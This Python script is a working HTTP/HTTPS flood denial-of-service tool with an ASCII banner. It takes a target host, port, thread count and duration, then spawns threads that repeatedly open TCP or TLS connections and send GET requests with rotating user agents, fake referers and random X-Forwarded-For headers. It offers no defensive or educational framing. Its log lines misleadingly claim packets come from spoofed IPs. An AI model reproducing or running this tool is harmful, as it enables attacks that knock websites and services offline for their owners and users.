import socket
import ssl
import threading
import random
import time
import sys
import os
import json
import re
import signal

# Terminal Colors
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

CONFIG_FILE = "ddos_config.json"
stop_attack = False

user_agents = [
    "Mozilla/5.0 (Windows NT 10.1; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)",
    "curl/7.64.1",
    "Wget/1.20.3"
]

referers = [
    "https://google.com",
    "https://bing.com",
    "https://duckduckgo.com",
    "https://yahoo.com"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_valid_ip(ip: str) -> bool:
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if pattern.match(ip):
        parts = ip.split('.')
        return all(0 <= int(part) < 256 for part in parts)
    return False

def is_valid_domain(domain: str) -> bool:
    pattern = re.compile(
        r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
        r"(\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*\.?$"
    )
    return bool(pattern.match(domain))

def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def gen_http_payload(target_host: str) -> bytes:
    fake_ip = random_ip()
    ua = random.choice(user_agents)
    ref = random.choice(referers)
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"X-Forwarded-For: {fake_ip}\r\n"
        f"Referer: {ref}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()

class AttackStats:
    def __init__(self):
        self.success = 0
        self.fail = 0
        self.lock = threading.Lock()
    def inc_success(self):
        with self.lock:
            self.success +=1
    def inc_fail(self):
        with self.lock:
            self.fail +=1
    def get(self):
        with self.lock:
            return self.success, self.fail

class Logger:
    def __init__(self, success_log_file="success.log", fail_log_file="fail.log"):
        self.sfile = open(success_log_file, "a")
        self.ffile = open(fail_log_file, "a")
        self.lock = threading.Lock()

    def log_success(self, msg: str):
        with self.lock:
            self.sfile.write(msg + "\n")
            self.sfile.flush()

    def log_fail(self, msg: str):
        with self.lock:
            self.ffile.write(msg + "\n")
            self.ffile.flush()

    def close(self):
        self.sfile.close()
        self.ffile.close()

def tcp_flood(target_ip: str, target_port: int, target_host: str, stats: AttackStats, logger: Logger):
    while not stop_attack:
        fake_ip = random_ip()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(4)
                s.connect((target_ip, target_port))
                payload = gen_http_payload(target_host)
                s.sendall(payload)
            stats.inc_success()
            logger.log_success(f"TCP packet sent from {fake_ip}")
        except Exception as e:
            stats.inc_fail()
            logger.log_fail(f"TCP send failed from {fake_ip}: {e}")

def https_flood(target_ip: str, target_port: int, target_host: str, stats: AttackStats, logger: Logger):
    context = ssl.create_default_context()
    while not stop_attack:
        fake_ip = random_ip()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(4)
                with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                    ssock.connect((target_ip, target_port))
                    payload = gen_http_payload(target_host)
                    ssock.sendall(payload)
            stats.inc_success()
            logger.log_success(f"HTTPS packet sent from {fake_ip}")
        except Exception as e:
            stats.inc_fail()
            logger.log_fail(f"HTTPS send failed from {fake_ip}: {e}")

def print_banner():
    clear_screen()
    print(f"""{C}
███╗   ██╗███████╗████████╗     ██████╗ ██╗      ██████╗ ███████╗████████╗
████╗  ██║██╔════╝╚══██╔══╝    ██╔═══██╗██║     ██╔═══██╗██╔════╝╚══██╔══╝
██╔██╗ ██║█████╗     ██║       ██║   ██║██║     ██║   ██║█████╗     ██║   
██║╚██╗██║██╔══╝     ██║       ██║   ██║██║     ██║   ██║██╔══╝     ██║   
██║ ╚████║███████╗   ██║       ╚██████╔╝███████╗╚██████╔╝███████╗   ██║   
╚═╝  ╚═══╝╚══════╝   ╚═╝        ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   
     {Y}Combined HTTP & HTTPS DDoS Tool | Made in MD Abdullah{W}
""")

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n{Y}[*] Ctrl+C detected. Stopping attack...{W}")
    stop_attack = True

def get_input(prompt: str, validate_func=None, err_msg="Invalid input!") -> str:
    while True:
        val = input(prompt).strip()
        if validate_func is None or validate_func(val):
            return val
        print(f"{R}{err_msg}{W}")

def save_config(data: dict):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(data, f, indent=4)
        print(f"{G}[+] Configuration saved to {CONFIG_FILE}{W}")
    except Exception as e:
        print(f"{R}Failed to save config: {e}{W}")

def load_config() -> dict:
    if not os.path.isfile(CONFIG_FILE):
        return {}
    try:
        with open(CONFIG_FILE, 'r') as f:
            data = json.load(f)
        print(f"{G}[+] Loaded configuration from {CONFIG_FILE}{W}")
        return data
    except Exception as e:
        print(f"{R}Failed to load config: {e}{W}")
        return {}

def main():
    global stop_attack
    signal.signal(signal.SIGINT, signal_handler)
    print_banner()

    config = load_config()
    use_saved = False
    if config:
        ans = get_input(f"{Y}Use saved config? (y/n): {W}", lambda x: x.lower() in ['y', 'n'])
        use_saved = ans.lower() == 'y'

    if use_saved:
        target = config.get("target")
        target_port = config.get("target_port")
        method = config.get("method")
        thread_count = config.get("thread_count")
        duration = config.get("duration")
    else:
        target = get_input(f"{Y}Enter target domain or IP: {W}", lambda x: is_valid_domain(x) or is_valid_ip(x), "Enter a valid IP or domain!")
        port_str = get_input(f"{Y}Enter target port (e.g. 80 or 443): {W}", lambda x: x.isdigit() and 0 < int(x) <= 65535, "Enter a valid port number (1-65535)!")
        target_port = int(port_str)
        print(f"{Y}Select attack method:{W}")
        print("1. TCP Flood (HTTP)")
        print("2. HTTPS Flood")
        method = get_input("Choice (1 or 2): ", lambda x: x in ['1', '2'], "Invalid choice!")
        thread_count_str = get_input(f"{Y}Enter number of threads (e.g. 100): {W}", lambda x: x.isdigit() and int(x)>0, "Enter a positive integer!")
        thread_count = int(thread_count_str)
        duration_str = get_input(f"{Y}Enter attack duration in seconds (e.g. 60): {W}", lambda x: x.isdigit() and int(x)>0, "Enter a positive integer!")
        duration = int(duration_str)

        save = get_input(f"{Y}Save this config for next time? (y/n): {W}", lambda x: x.lower() in ['y', 'n'])
        if save.lower() == 'y':
            save_config({
                "target": target,
                "target_port": target_port,
                "method": method,
                "thread_count": thread_count,
                "duration": duration
            })

    # Resolve target IP
    try:
        target_ip = socket.gethostbyname(target)
    except Exception as e:
        print(f"{R}Could not resolve target {target}: {e}{W}")
        sys.exit(1)

    stats = AttackStats()
    logger = Logger()

    print(f"{C}[+] Starting attack on {target_ip}:{target_port} for {duration}s with {thread_count} threads...{W}")
    time.sleep(1)

    threads = []

    # Start status display thread
    def status_printer():
        while not stop_attack:
            success, fail = stats.get()
            print(f"{Y}[Status] Success: {success} | Fail: {fail}{W}", end='\r')
            time.sleep(1)

    status_thread = threading.Thread(target=status_printer, daemon=True)
    status_thread.start()

    # Start attack threads
    for _ in range(thread_count):
        if method == '1':
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, target, stats, logger), daemon=True)
        else:
            t = threading.Thread(target=https_flood, args=(target_ip, target_port, target, stats, logger), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.01)

    # Wait for attack duration
    start_time = time.time()
    while time.time() - start_time < duration and not stop_attack:
        time.sleep(0.5)

    stop_attack = True

    for t in threads:
        t.join()

    logger.close()
    print(f"\n{G}Attack finished! Total packets sent: {stats.success}, Failed attempts: {stats.fail}{W}")
    print(f"{Y}Success log saved to success.log")
    print(f"{Y}Failure log saved to fail.log")
    print(f"{Y}Exiting...{W}")
    time.sleep(2)

if __name__ == "__main__":
    main()
